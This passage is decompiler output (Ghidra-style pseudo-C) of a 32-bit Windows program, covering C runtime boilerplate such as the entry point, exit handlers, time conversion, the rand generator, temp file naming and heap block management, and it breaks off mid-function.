void __cdecl FUN_00415d42(uint *param_1,uint *param_2)

{
  FUN_00415d55(0,param_1,param_2);
  return;
}



uint * __cdecl FUN_00415d55(uint param_1,uint *param_2,uint *param_3)

{
  uint uVar1;
  int iVar2;
  DWORD DVar3;
  uint *puVar4;
  uint *puVar5;
  uint local_10c [65];
  LPSTR local_8;
  
  uVar1 = param_1;
  if (param_1 == 0) {
    DVar3 = GetCurrentDirectoryA(0x104,(LPSTR)local_10c);
  }
  else {
    iVar2 = FUN_00415e26(param_1);
    if (iVar2 == 0) {
      DAT_00425194 = 0xd;
      DAT_00425198 = 0xf;
      return (uint *)0x0;
    }
    param_1 = (uint)CONCAT12(0x2e,CONCAT11(0x3a,(char)uVar1 + '@'));
    DVar3 = GetFullPathNameA((LPCSTR)&param_1,0x104,(LPSTR)local_10c,&local_8);
  }
  if ((DVar3 != 0) && (puVar4 = (uint *)(DVar3 + 1), puVar4 < (uint *)0x105)) {
    if (param_2 == (uint *)0x0) {
      if ((int)puVar4 <= (int)param_3) {
        puVar4 = param_3;
      }
      puVar5 = (uint *)FUN_00415216(puVar4);
      if (puVar5 != (uint *)0x0) {
LAB_00415e12:
        puVar4 = FUN_0041a1d0(puVar5,local_10c);
        return puVar4;
      }
      DAT_00425194 = 0xc;
    }
    else {
      puVar5 = param_2;
      if ((int)puVar4 <= (int)param_3) goto LAB_00415e12;
      DAT_00425194 = 0x22;
    }
  }
  return (uint *)0x0;
}



undefined4 __cdecl FUN_00415e26(uint param_1)

{
  char cVar1;
  UINT UVar2;
  
  if (param_1 != 0) {
    cVar1 = (char)param_1;
    param_1 = (uint)CONCAT12(0x5c,CONCAT11(0x3a,cVar1 + '@'));
    UVar2 = GetDriveTypeA((LPCSTR)&param_1);
    if ((UVar2 == 0) || (UVar2 == 1)) {
      return 0;
    }
  }
  return 1;
}



char * __cdecl FUN_00415e60(char *param_1,char param_2)

{
  char cVar1;
  int iVar2;
  char *pcVar3;
  char *pcVar4;
  
  iVar2 = -1;
  do {
    pcVar4 = param_1;
    if (iVar2 == 0) break;
    iVar2 = iVar2 + -1;
    pcVar4 = param_1 + 1;
    cVar1 = *param_1;
    param_1 = pcVar4;
  } while (cVar1 != '\0');
  iVar2 = -(iVar2 + 1);
  pcVar4 = pcVar4 + -1;
  do {
    pcVar3 = pcVar4;
    if (iVar2 == 0) break;
    iVar2 = iVar2 + -1;
    pcVar3 = pcVar4 + -1;
    cVar1 = *pcVar4;
    pcVar4 = pcVar3;
  } while (param_2 != cVar1);
  pcVar3 = pcVar3 + 1;
  if (*pcVar3 != param_2) {
    pcVar3 = (char *)0x0;
  }
  return pcVar3;
}



void __cdecl FUN_00415e87(int param_1,uint *param_2)

{
  FUN_0041a2c0(param_1,param_2,(uint **)&stack0x0000000c,(uint **)0x0);
  return;
}



void FUN_00415e9f(void)

{
  if (DAT_00426834 != (code *)0x0) {
    (*DAT_00426834)();
  }
  FUN_00415f87((undefined **)&DAT_00403008,(undefined **)&DAT_00403018);
  FUN_00415f87((undefined **)&DAT_00403000,(undefined **)&DAT_00403004);
  return;
}



void __cdecl FUN_00415ecc(UINT param_1)

{
  FUN_00415eee(param_1,0,0);
  return;
}



void __cdecl FUN_00415edd(UINT param_1)

{
  FUN_00415eee(param_1,1,0);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __cdecl FUN_00415eee(UINT param_1,int param_2,int param_3)

{
  HANDLE hProcess;
  code **ppcVar1;
  UINT uExitCode;
  
  if (DAT_004251dc == 1) {
    uExitCode = param_1;
    hProcess = GetCurrentProcess();
    TerminateProcess(hProcess,uExitCode);
  }
  _DAT_004251d8 = 1;
  DAT_004251d4 = (undefined)param_3;
  if (param_2 == 0) {
    if ((DAT_00426830 != (code **)0x0) &&
       (ppcVar1 = (code **)(DAT_0042682c - 4), DAT_00426830 <= ppcVar1)) {
      do {
        if (*ppcVar1 != (code *)0x0) {
          (**ppcVar1)();
        }
        ppcVar1 = ppcVar1 + -1;
      } while (DAT_00426830 <= ppcVar1);
    }
    FUN_00415f87((undefined **)&DAT_0040301c,(undefined **)&DAT_00403028);
  }
  FUN_00415f87((undefined **)&DAT_0040302c,(undefined **)&DAT_00403034);
  if (param_3 != 0) {
    return;
  }
  DAT_004251dc = 1;
                    // WARNING: Subroutine does not return
  ExitProcess(param_1);
}



void __cdecl FUN_00415f87(undefined **param_1,undefined **param_2)

{
  for (; param_1 < param_2; param_1 = (code **)param_1 + 1) {
    if ((code *)*param_1 != (code *)0x0) {
      (*(code *)*param_1)();
    }
  }
  return;
}



void __cdecl FUN_00415fa1(int *param_1)

{
  DWORD DVar1;
  int iVar2;
  _TIME_ZONE_INFORMATION local_d0;
  _SYSTEMTIME local_24;
  _SYSTEMTIME local_14;
  
  GetLocalTime(&local_14);
  GetSystemTime(&local_24);
  if (local_24.wMinute == DAT_004251f0._2_2_) {
    if (local_24.wHour == (WORD)DAT_004251f0) {
      if (local_24.wDay == DAT_004251ec._2_2_) {
        if (local_24.wMonth == DAT_004251e8._2_2_) {
          if (local_24.wYear == (WORD)DAT_004251e8) goto LAB_0041604b;
        }
      }
    }
  }
  DVar1 = GetTimeZoneInformation(&local_d0);
  if (DVar1 == 0xffffffff) {
    DAT_004251e0 = -1;
  }
  else if (((DVar1 == 2) && (local_d0.DaylightDate.wMonth != 0)) && (local_d0.DaylightBias != 0)) {
    DAT_004251e0 = 1;
  }
  else {
    DAT_004251e0 = 0;
  }
  DAT_004251e8._0_2_ = local_24.wYear;
  DAT_004251e8._2_2_ = local_24.wMonth;
  DAT_004251ec._0_2_ = local_24.wDayOfWeek;
  DAT_004251ec._2_2_ = local_24.wDay;
  DAT_004251f0._0_2_ = local_24.wHour;
  DAT_004251f0._2_2_ = local_24.wMinute;
  DAT_004251f4._0_2_ = local_24.wSecond;
  DAT_004251f4._2_2_ = local_24.wMilliseconds;
LAB_0041604b:
  iVar2 = FUN_0041a45a((uint)local_14.wYear,(uint)local_14.wMonth,(uint)local_14.wDay,
                       (uint)local_14.wHour,(uint)local_14.wMinute,(uint)local_14.wSecond,
                       DAT_004251e0);
  if (param_1 != (int *)0x0) {
    *param_1 = iVar2;
  }
  return;
}



int FUN_0041607d(void)

{
  int *piVar1;
  int iVar2;
  int iVar3;
  
  iVar2 = 0;
  iVar3 = 0;
  if (0 < DAT_004266e0) {
    do {
      piVar1 = *(int **)(DAT_004256c8 + iVar2 * 4);
      if (((piVar1 != (int *)0x0) && ((*(byte *)(piVar1 + 3) & 0x83) != 0)) && (piVar1[7] != 0)) {
        FUN_004150d8(piVar1);
        iVar3 = iVar3 + 1;
      }
      iVar2 = iVar2 + 1;
    } while (iVar2 < DAT_004266e0);
  }
  return iVar3;
}



uint * __cdecl FUN_004160b9(uint *param_1)

{
  char cVar1;
  int iVar2;
  uint *puVar3;
  uint *local_8;
  
  local_8 = (uint *)0x0;
  if (DAT_00425250 == 0) {
    cVar1 = *(char *)param_1;
    puVar3 = param_1;
    while (cVar1 != '\0') {
      cVar1 = *(char *)puVar3;
      if (('@' < cVar1) && (cVar1 < '[')) {
        *(char *)puVar3 = cVar1 + ' ';
      }
      puVar3 = (uint *)((int)puVar3 + 1);
      cVar1 = *(char *)puVar3;
    }
  }
  else {
    puVar3 = (uint *)FUN_0041a5d5(DAT_00425250,0x100,(char *)param_1,-1,(LPWSTR)0x0,0,0,1);
    if (((puVar3 != (uint *)0x0) && (local_8 = (uint *)FUN_00415216(puVar3), local_8 != (uint *)0x0)
        ) && (iVar2 = FUN_0041a5d5(DAT_00425250,0x100,(char *)param_1,-1,(LPWSTR)local_8,(int)puVar3
                                   ,0,1), iVar2 != 0)) {
      FUN_0041a1d0(param_1,local_8);
    }
    FUN_004150a9(local_8);
  }
  return param_1;
}



int __cdecl FUN_00416157(uint *param_1,int **param_2)

{
  char *pcVar1;
  int iVar2;
  char *pcVar3;
  
  pcVar1 = FUN_004194b0(param_1);
  iVar2 = FUN_0041a7f9(param_2);
  pcVar3 = (char *)FUN_00415b00(param_1,1,(uint)pcVar1,(char **)param_2);
  FUN_0041a886(iVar2,(int *)param_2);
  return (pcVar3 == pcVar1) - 1;
}



char * __cdecl FUN_0041619a(char *param_1,int param_2,byte **param_3)

{
  byte **ppbVar1;
  uint uVar2;
  char *pcVar3;
  
  if (param_2 < 1) {
    param_1 = (char *)0x0;
  }
  else {
    param_2 = param_2 + -1;
    pcVar3 = param_1;
    if (param_2 != 0) {
      while( true ) {
        ppbVar1 = param_3 + 1;
        *ppbVar1 = *ppbVar1 + -1;
        if ((int)*ppbVar1 < 0) {
          uVar2 = FUN_0041768f(param_3);
        }
        else {
          uVar2 = (uint)**param_3;
          *param_3 = *param_3 + 1;
        }
        if (uVar2 == 0xffffffff) break;
        *pcVar3 = (char)uVar2;
        pcVar3 = pcVar3 + 1;
        if (((char)uVar2 == '\n') || (param_2 = param_2 + -1, param_2 == 0)) goto LAB_004161de;
      }
      if (pcVar3 == param_1) {
        return (char *)0x0;
      }
    }
LAB_004161de:
    *pcVar3 = '\0';
  }
  return param_1;
}



undefined4 * FUN_004161f1(void)

{
  undefined4 *puVar1;
  uint uVar2;
  int iVar3;
  uint *puVar4;
  uint uVar5;
  
  if (DAT_0042520c == '\0') {
    FUN_004162a8(1);
  }
  else {
    iVar3 = FUN_00416309((byte *)&DAT_0042520c);
    if (iVar3 != 0) {
      return (undefined4 *)0x0;
    }
  }
  puVar1 = FUN_00418984();
  if (puVar1 != (undefined4 *)0x0) {
    uVar2 = FUN_0041a932(&DAT_0042520c,0x8542,0x40,0x180);
    if (uVar2 == 0xffffffff) {
      do {
        if ((DAT_00425194 != 0x11) || (iVar3 = FUN_00416309((byte *)&DAT_0042520c), iVar3 != 0))
        break;
        uVar2 = FUN_0041a932(&DAT_0042520c,0x8542,0x40,0x180);
      } while (uVar2 == 0xffffffff);
      if (uVar2 == 0xffffffff) {
        return (undefined4 *)0x0;
      }
    }
    puVar4 = FUN_0041a907((uint *)&DAT_0042520c);
    puVar1[7] = puVar4;
    if (puVar4 != (uint *)0x0) {
      puVar1[1] = 0;
      *puVar1 = 0;
      puVar1[2] = 0;
      uVar5 = DAT_00425270 | 0x80;
      puVar1[4] = uVar2;
      puVar1[3] = uVar5;
      return puVar1;
    }
    FUN_004174a4(uVar2);
  }
  return (undefined4 *)0x0;
}



void __cdecl FUN_004162a8(int param_1)

{
  undefined *puVar1;
  char *pcVar2;
  DWORD DVar3;
  uint *puVar4;
  uint uVar5;
  
  puVar4 = (uint *)&DAT_004251fc;
  if (param_1 != 0) {
    puVar4 = (uint *)&DAT_0042520c;
  }
  FUN_0041a1d0(puVar4,(uint *)&DAT_00406d74);
  puVar1 = (undefined *)((int)puVar4 + 1);
  if ((*(char *)puVar4 != '\\') && (*(char *)puVar4 != '/')) {
    *puVar1 = 0x5c;
    puVar1 = (undefined *)((int)puVar4 + 2);
  }
  if (param_1 == 0) {
    *puVar1 = 0x73;
  }
  else {
    *puVar1 = 0x74;
  }
  pcVar2 = puVar1 + 1;
  uVar5 = 0x20;
  DVar3 = GetCurrentProcessId();
  FUN_0041656a(DVar3,pcVar2,uVar5);
  FUN_0041a1e0(puVar4,(uint *)&DAT_004079dc);
  return;
}



undefined4 __cdecl FUN_00416309(byte *param_1)

{
  int iVar1;
  int iVar2;
  undefined4 uVar3;
  uint *puVar4;
  void *this;
  
  iVar1 = FUN_0041ae10(param_1,0x2e);
  iVar2 = FUN_0041adf9(this,(byte *)(uint *)(iVar1 + 1),(byte **)0x0,(void *)0x20);
  if (iVar2 + 1U < 0x7fff) {
    puVar4 = (uint *)FUN_0041656a(iVar2 + 1U,(char *)&param_1,0x20);
    FUN_0041a1d0((uint *)(iVar1 + 1),puVar4);
    uVar3 = 0;
  }
  else {
    uVar3 = 0xffffffff;
  }
  return uVar3;
}



int __cdecl FUN_0041634f(int **param_1,byte *param_2)

{
  int iVar1;
  int iVar2;
  
  iVar1 = FUN_0041a7f9(param_1);
  iVar2 = FUN_0041800a((char **)param_1,param_2,(undefined4 *)&stack0x0000000c);
  FUN_0041a886(iVar1,(int *)param_1);
  return iVar2;
}



int * __cdecl FUN_00416381(int *param_1)

{
  bool bVar1;
  int *piVar2;
  undefined3 extraout_var;
  undefined3 extraout_var_00;
  int iVar3;
  
  piVar2 = param_1;
  if (*param_1 < 0) {
    piVar2 = (int *)0x0;
  }
  else {
    FUN_0041ae70();
    iVar3 = *piVar2;
    if ((iVar3 < 0x3f481) || (0x7ffc0b7e < iVar3)) {
      piVar2 = (int *)FUN_0041b3cf(piVar2);
      bVar1 = FUN_0041b0e3(piVar2);
      iVar3 = *piVar2;
      if (CONCAT31(extraout_var_00,bVar1) != 0) {
        iVar3 = iVar3 - DAT_00408b48;
      }
      param_1 = (int *)(iVar3 - DAT_00408b40);
      iVar3 = (int)param_1 % 0x3c;
      *piVar2 = iVar3;
      if (iVar3 < 0) {
        *piVar2 = iVar3 + 0x3c;
        param_1 = param_1 + -0xf;
      }
      param_1 = (int *)((int)param_1 / 0x3c + piVar2[1]);
      iVar3 = (int)param_1 % 0x3c;
      piVar2[1] = iVar3;
      if (iVar3 < 0) {
        piVar2[1] = iVar3 + 0x3c;
        param_1 = param_1 + -0xf;
      }
      param_1 = (int *)((int)param_1 / 0x3c + piVar2[2]);
      iVar3 = (int)param_1 % 0x18;
      piVar2[2] = iVar3;
      if (iVar3 < 0) {
        piVar2[2] = iVar3 + 0x18;
        param_1 = param_1 + -6;
      }
      iVar3 = (int)param_1 / 0x18;
      if (iVar3 < 1) {
        if (-1 < iVar3) {
          return piVar2;
        }
        piVar2[6] = (piVar2[6] + 7 + iVar3) % 7;
        piVar2[3] = piVar2[3] + iVar3;
        if (piVar2[3] < 1) {
          piVar2[5] = piVar2[5] + -1;
          piVar2[3] = piVar2[3] + 0x1f;
          piVar2[7] = 0x16c;
          piVar2[4] = 0xb;
          return piVar2;
        }
      }
      else {
        piVar2[6] = (piVar2[6] + iVar3) % 7;
        piVar2[3] = piVar2[3] + iVar3;
      }
      piVar2[7] = piVar2[7] + iVar3;
    }
    else {
      param_1 = (int *)(iVar3 - DAT_00408b40);
      piVar2 = (int *)FUN_0041b3cf((int *)&param_1);
      if ((DAT_00408b44 != 0) && (bVar1 = FUN_0041b0e3(piVar2), CONCAT31(extraout_var,bVar1) != 0))
      {
        param_1 = (int *)((int)param_1 - DAT_00408b48);
        piVar2 = (int *)FUN_0041b3cf((int *)&param_1);
        piVar2[8] = 1;
      }
    }
  }
  return piVar2;
}



char * __cdecl FUN_004164e1(uint param_1,char *param_2,uint param_3)

{
  int iVar1;
  
  if ((param_3 == 10) && ((int)param_1 < 0)) {
    iVar1 = 1;
    param_3 = 10;
  }
  else {
    iVar1 = 0;
  }
  FUN_0041650e(param_1,param_2,param_3,iVar1);
  return param_2;
}



void __cdecl FUN_0041650e(uint param_1,char *param_2,uint param_3,int param_4)

{
  ulonglong uVar1;
  char *pcVar2;
  char *pcVar3;
  char cVar4;
  
  pcVar2 = param_2;
  if (param_4 != 0) {
    *param_2 = '-';
    param_2 = param_2 + 1;
    param_1 = -param_1;
    pcVar2 = param_2;
  }
  do {
    pcVar3 = pcVar2;
    uVar1 = (ulonglong)param_1;
    param_1 = param_1 / param_3;
    cVar4 = (char)(uVar1 % (ulonglong)param_3);
    if ((uint)(uVar1 % (ulonglong)param_3) < 10) {
      cVar4 = cVar4 + '0';
    }
    else {
      cVar4 = cVar4 + 'W';
    }
    *pcVar3 = cVar4;
    pcVar2 = pcVar3 + 1;
  } while (param_1 != 0);
  pcVar3[1] = '\0';
  do {
    cVar4 = *pcVar3;
    *pcVar3 = *param_2;
    *param_2 = cVar4;
    pcVar3 = pcVar3 + -1;
    param_2 = param_2 + 1;
  } while (param_2 < pcVar3);
  return;
}



char * __cdecl FUN_0041656a(uint param_1,char *param_2,uint param_3)

{
  FUN_0041650e(param_1,param_2,param_3,0);
  return param_2;
}



void __cdecl FUN_00416585(undefined4 param_1)

{
  DAT_004086f8 = param_1;
  return;
}



uint FUN_0041658f(void)

{
  DAT_004086f8 = DAT_004086f8 * 0x343fd + 0x269ec3;
  return DAT_004086f8 >> 0x10 & 0x7fff;
}



void FUN_004165b0(void)

{
  undefined4 unaff_FS_OFFSET;
  undefined auStack_c [12];
  
  *(undefined **)unaff_FS_OFFSET = auStack_c;
  return;
}



undefined4 __cdecl FUN_004165cf(LPCSTR param_1,LPCSTR param_2)

{
  BOOL BVar1;
  uint uVar2;
  
  BVar1 = MoveFileA(param_1,param_2);
  if (BVar1 == 0) {
    uVar2 = GetLastError();
  }
  else {
    uVar2 = 0;
  }
  if (uVar2 != 0) {
    FUN_0041a0e2(uVar2);
    return 0xffffffff;
  }
  return 0;
}



uint __thiscall FUN_004165fd(void *this,uint param_1)

{
  uint uVar1;
  uint uVar2;
  int iVar3;
  void *local_8;
  
  uVar1 = param_1;
  if (DAT_00425250 == 0) {
    if ((0x40 < (int)param_1) && ((int)param_1 < 0x5b)) {
      uVar1 = param_1 + 0x20;
    }
  }
  else {
    iVar3 = 1;
    local_8 = this;
    if ((int)param_1 < 0x100) {
      if (DAT_00408e0c < 2) {
        uVar2 = (byte)PTR_DAT_00408c00[param_1 * 2] & 1;
      }
      else {
        uVar2 = FUN_0041b5b5(this,param_1,1);
      }
      if (uVar2 == 0) {
        return uVar1;
      }
    }
    if ((PTR_DAT_00408c00[((int)uVar1 >> 8 & 0xffU) * 2 + 1] & 0x80) == 0) {
      param_1 = CONCAT31((int3)(param_1 >> 8),(char)uVar1) & 0xffff00ff;
    }
    else {
      uVar2 = param_1 >> 0x10;
      param_1._0_2_ = CONCAT11((char)uVar1,(char)(uVar1 >> 8));
      param_1 = CONCAT22((short)uVar2,(undefined2)param_1) & 0xff00ffff;
      iVar3 = 2;
    }
    iVar3 = FUN_0041a5d5(DAT_00425250,0x100,(char *)&param_1,iVar3,(LPWSTR)&local_8,3,0,1);
    if (iVar3 != 0) {
      if (iVar3 == 1) {
        uVar1 = (uint)local_8 & 0xff;
      }
      else {
        uVar1 = (uint)local_8 & 0xffff;
      }
    }
  }
  return uVar1;
}



undefined4 __cdecl FUN_004166c8(LPCSTR param_1)

{
  BOOL BVar1;
  uint uVar2;
  
  BVar1 = RemoveDirectoryA(param_1);
  if (BVar1 == 0) {
    uVar2 = GetLastError();
  }
  else {
    uVar2 = 0;
  }
  if (uVar2 != 0) {
    FUN_0041a0e2(uVar2);
    return 0xffffffff;
  }
  return 0;
}



undefined4 __cdecl FUN_004166f2(LPCSTR param_1)

{
  BOOL BVar1;
  uint uVar2;
  
  BVar1 = CreateDirectoryA(param_1,(LPSECURITY_ATTRIBUTES)0x0);
  if (BVar1 == 0) {
    uVar2 = GetLastError();
  }
  else {
    uVar2 = 0;
  }
  if (uVar2 != 0) {
    FUN_0041a0e2(uVar2);
    return 0xffffffff;
  }
  return 0;
}



uint __thiscall FUN_0041671e(void *this,uint param_1)

{
  uint uVar1;
  uint uVar2;
  int iVar3;
  void *local_8;
  
  uVar1 = param_1;
  if (DAT_00425250 == 0) {
    if ((0x60 < (int)param_1) && ((int)param_1 < 0x7b)) {
      uVar1 = param_1 - 0x20;
    }
  }
  else {
    local_8 = this;
    if ((int)param_1 < 0x100) {
      if (DAT_00408e0c < 2) {
        uVar2 = (byte)PTR_DAT_00408c00[param_1 * 2] & 2;
      }
      else {
        uVar2 = FUN_0041b5b5(this,param_1,2);
      }
      if (uVar2 == 0) {
        return uVar1;
      }
    }
    if ((PTR_DAT_00408c00[((int)uVar1 >> 8 & 0xffU) * 2 + 1] & 0x80) == 0) {
      param_1 = CONCAT31((int3)(param_1 >> 8),(char)uVar1) & 0xffff00ff;
      iVar3 = 1;
    }
    else {
      uVar2 = param_1 >> 0x10;
      param_1._0_2_ = CONCAT11((char)uVar1,(char)(uVar1 >> 8));
      param_1 = CONCAT22((short)uVar2,(undefined2)param_1) & 0xff00ffff;
      iVar3 = 2;
    }
    iVar3 = FUN_0041a5d5(DAT_00425250,0x200,(char *)&param_1,iVar3,(LPWSTR)&local_8,3,0,1);
    if (iVar3 != 0) {
      if (iVar3 == 1) {
        uVar1 = (uint)local_8 & 0xff;
      }
      else {
        uVar1 = (uint)local_8 & 0xffff;
      }
    }
  }
  return uVar1;
}



// WARNING: Removing unreachable block (ram,0x0041689d)
// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void entry(void)

{
  DWORD DVar1;
  int iVar2;
  byte *pbVar3;
  HMODULE pHVar4;
  UINT UVar5;
  int unaff_EBX;
  uint *unaff_ESI;
  uint unaff_EDI;
  undefined4 *unaff_FS_OFFSET;
  undefined4 uVar6;
  int in_stack_ffffff94;
  byte *pbVar7;
  uint in_stack_ffffff9c;
  DWORD in_stack_ffffffa0;
  LPSTR in_stack_ffffffa4;
  LPSTR in_stack_ffffffa8;
  LPSTR in_stack_ffffffac;
  DWORD in_stack_ffffffb0;
  _EXCEPTION_POINTERS *local_18;
  undefined4 uStack_14;
  undefined *puStack_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &DAT_004011f0;
  puStack_10 = &LAB_0041bc48;
  uStack_14 = *unaff_FS_OFFSET;
  *unaff_FS_OFFSET = &uStack_14;
  DVar1 = GetVersion();
  _DAT_004251ac = DVar1 >> 8 & 0xff;
  _DAT_004251a8 = DVar1 & 0xff;
  _DAT_004251a4 = _DAT_004251a8 * 0x100 + _DAT_004251ac;
  _DAT_004251a0 = DVar1 >> 0x10;
  iVar2 = FUN_00416929(0);
  if (iVar2 == 0) {
    FUN_00416905(0x1c);
  }
  local_8 = 0;
  FUN_00417cb0();
  DAT_00426820 = GetCommandLineA();
  DAT_0042521c = FUN_0041bb0c();
  FUN_0041b8bf();
  FUN_0041b806();
  FUN_00415e9f();
  GetStartupInfoA((LPSTARTUPINFOA)&stack0xffffffa0);
  pbVar3 = FUN_0041b7ae();
  iVar2 = 10;
  uVar6 = 0;
  pbVar7 = pbVar3;
  pHVar4 = GetModuleHandleA((LPCSTR)0x0);
  UVar5 = FUN_004103a0((int)pHVar4,uVar6,pbVar3,iVar2,unaff_EDI,unaff_ESI,unaff_EBX,
                       in_stack_ffffff94,(int)pbVar7,in_stack_ffffff9c,in_stack_ffffffa0,
                       in_stack_ffffffa4,(int)in_stack_ffffffa8,(int)in_stack_ffffffac,
                       in_stack_ffffffb0);
  FUN_00415ecc(UVar5);
  FUN_0041b62a(local_18->ExceptionRecord->ExceptionCode,local_18);
  return;
}



void __cdecl FUN_004168e0(DWORD param_1)

{
  if (DAT_00425224 == 1) {
    FUN_0041bd20();
  }
  FUN_0041bd59(param_1);
  (*(code *)PTR_FUN_004086fc)(0xff);
  return;
}



void __cdecl FUN_00416905(DWORD param_1)

{
  if (DAT_00425224 == 1) {
    FUN_0041bd20();
  }
  FUN_0041bd59(param_1);
                    // WARNING: Subroutine does not return
  ExitProcess(0xff);
}



undefined4 __cdecl FUN_00416929(int param_1)

{
  int iVar1;
  
  DAT_0042681c = HeapCreate((uint)(param_1 == 0),0x1000,0);
  if (DAT_0042681c != (HANDLE)0x0) {
    iVar1 = FUN_00416965();
    if (iVar1 != 0) {
      return 1;
    }
    HeapDestroy(DAT_0042681c);
  }
  return 0;
}



undefined4 FUN_00416965(void)

{
  DAT_00426818 = HeapAlloc(DAT_0042681c,0,0x140);
  if (DAT_00426818 == (LPVOID)0x0) {
    return 0;
  }
  DAT_00426810 = 0;
  DAT_00426814 = 0;
  DAT_0042680c = DAT_00426818;
  DAT_00426804 = 0x10;
  return 1;
}



uint __cdecl FUN_004169a3(int param_1)

{
  uint uVar1;
  
  uVar1 = DAT_00426818;
  while( true ) {
    if (DAT_00426818 + DAT_00426814 * 0x14 <= uVar1) {
      return 0;
    }
    if ((uint)(param_1 - *(int *)(uVar1 + 0xc)) < 0x100000) break;
    uVar1 = uVar1 + 0x14;
  }
  return uVar1;
}



void __cdecl FUN_004169ce(uint *param_1,uint param_2)

{
  char *pcVar1;
  uint *puVar2;
  int *piVar3;
  char cVar4;
  uint uVar5;
  int iVar6;
  uint uVar7;
  byte bVar8;
  int *piVar9;
  uint uVar10;
  uint uVar11;
  uint uVar12;
  int local_10;
  
  uVar5 = param_1[4];
  iVar6 = *(int *)(param_2 - 4);
  piVar9 = (int *)(param_2 - 4);
  uVar10 = param_2 - param_1[3] >> 0xf;
  uVar7 = *(uint *)(param_2 - 8);
  local_10 = iVar6 + -1;
  piVar3 = (int *)(uVar10 * 0x204 + 0x144 + uVar5);
  uVar12 = *(uint *)(local_10 + (int)piVar9);
  if ((uVar12 & 1) == 0) {
    param_2 = ((int)uVar12 >> 4) - 1;
    if (0x3f < param_2) {
      param_2 = 0x3f;
    }
    if (*(int *)(iVar6 + 3 + (int)piVar9) == *(int *)(iVar6 + 7 + (int)piVar9)) {
      if (param_2 < 0x20) {
        pcVar1 = (char *)(param_2 + 4 + uVar5);
        uVar11 = ~(0x80000000U >> ((byte)param_2 & 0x1f));
        puVar2 = (uint *)(uVar5 + 0x44 + uVar10 * 4);
        *puVar2 = *puVar2 & uVar11;
        *pcVar1 = *pcVar1 + -1;
        if (*pcVar1 == '\0') {
          *param_1 = *param_1 & uVar11;
        }
      }
      else {
        pcVar1 = (char *)(param_2 + 4 + uVar5);
        uVar11 = ~(0x80000000U >> ((byte)param_2 - 0x20 & 0x1f));
        puVar2 = (uint *)(uVar5 + 0xc4 + uVar10 * 4);
        *puVar2 = *puVar2 & uVar11;
        *pcVar1 = *pcVar1 + -1;
        if (*pcVar1 == '\0') {
          param_1[1] = param_1[1] & uVar11;
        }
      }
    }
    *(undefined4 *)(*(int *)(iVar6 + 7 + (int)piVar9) + 4) =
         *(undefined4 *)(iVar6 + 3 + (int)piVar9);
    local_10 = local_10 + uVar12;
    *(undefined4 *)(*(int *)(iVar6 + 3 + (int)piVar9) + 8) =
         *(undefined4 *)(iVar6 + 7 + (int)piVar9);
  }
  uVar12 = (local_10 >> 4) - 1;
  if (0x3f < uVar12) {
    uVar12 = 0x3f;
  }
  if ((uVar7 & 1) == 0) {
    piVar9 = (int *)((int)piVar9 - uVar7);
    param_2 = ((int)uVar7 >> 4) - 1;
    if (0x3f < param_2) {
      param_2 = 0x3f;
    }
    local_10 = local_10 + uVar7;
    uVar12 = (local_10 >> 4) - 1;
    if (0x3f < uVar12) {
      uVar12 = 0x3f;
    }
    if (param_2 != uVar12) {
      if (piVar9[1] == piVar9[2]) {
        if (param_2 < 0x20) {
          pcVar1 = (char *)(param_2 + 4 + uVar5);
          uVar11 = ~(0x80000000U >> ((byte)param_2 & 0x1f));
          puVar2 = (uint *)(uVar5 + 0x44 + uVar10 * 4);
          *puVar2 = *puVar2 & uVar11;
          *pcVar1 = *pcVar1 + -1;
          if (*pcVar1 == '\0') {
            *param_1 = *param_1 & uVar11;
          }
        }
        else {
          pcVar1 = (char *)(param_2 + 4 + uVar5);
          uVar11 = ~(0x80000000U >> ((byte)param_2 - 0x20 & 0x1f));
          puVar2 = (uint *)(uVar5 + 0xc4 + uVar10 * 4);
          *puVar2 = *puVar2 & uVar11;
          *pcVar1 = *pcVar1 + -1;
          if (*pcVar1 == '\0') {
            param_1[1] = param_1[1] & uVar11;
          }
        }
      }
      *(int *)(piVar9[2] + 4) = piVar9[1];
      *(int *)(piVar9[1] + 8) = piVar9[2];
    }
  }
  if (((uVar7 & 1) != 0) || (param_2 != uVar12)) {
    piVar9[1] = piVar3[uVar12 * 2 + 1];
    piVar9[2] = (int)(piVar3 + uVar12 * 2);
    (piVar3 + uVar12 * 2)[1] = (int)piVar9;
    *(int **)(piVar9[1] + 8) = piVar9;
    if (piVar9[1] == piVar9[2]) {
      cVar4 = *(char *)(uVar12 + 4 + uVar5);
      *(char *)(uVar12 + 4 + uVar5) = cVar4 + '\x01';
      bVar8 = (byte)uVar12;
      if (uVar12 < 0x20) {
        if (cVar4 == '\0') {
          *param_1 = *param_1 | 0x80000000U >> (bVar8 & 0x1f);
        }
        puVar2 = (uint *)(uVar5 + 0x44 + uVar10 * 4);
        *puVar2 = *puVar2 | 0x80000000U >> (bVar8 & 0x1f);
      }
      else {
        if (cVar4 == '\0') {
          param_1[1] = param_1[1] | 0x80000000U >> (bVar8 - 0x20 & 0x1f);
        }
        puVar2 = (uint *)(uVar5 + 0xc4 + uVar10 * 4);
        *puVar2 = *puVar2 | 0x80000000U >> (bVar8 - 0x20 & 0x1f);
      }
    }
  }
  *piVar9 = local_10;
  *(int *)(local_10 + -4 + (int)piVar9) = local_10;
  *piVar3 = *piVar3 + -1;
  uVar5 = DAT_00426808;
  puVar2 = DAT_00426810;
  if ((*piVar3 == 0) && (uVar5 = uVar10, puVar2 = param_1, DAT_00426810 != (uint *)0x0)) {
    VirtualFree((LPVOID)(DAT_00426808 * 0x8000 + DAT_00426810[3]),0x8000,0x4000);
    DAT_00426810[2] = DAT_00426810[2] | 0x80000000U >> ((byte)DAT_00426808 & 0x1f);
    *(undefined4 *)(DAT_00426810[4] + 0xc4 + DAT_00426808 * 4) = 0;
    *(char *)(DAT_00426810[4] + 0x43) = *(char *)(DAT_00426810[4] + 0x43) + -1;
    if (*(char *)(DAT_00426810[4] + 0x43) == '\0') {
      DAT_00426810[1] = DAT_00426810[1] & 0xfffffffe;
    }
    puVar2 = param_1;
    if (DAT_00426810[2] == 0xffffffff) {
      VirtualFree((LPVOID)DAT_00426810[3],0,0x8000);
      HeapFree(DAT_0042681c,0,(LPVOID)DAT_00426810[4]);
      FUN_0041beb0(DAT_00426810,DAT_00426810 + 5,
                   (DAT_00426814 * 0x14 - (int)DAT_00426810) + -0x14 + DAT_00426818);
      DAT_00426814 = DAT_00426814 + -1;
      if (DAT_00426810 < param_1) {
        param_1 = param_1 + -5;
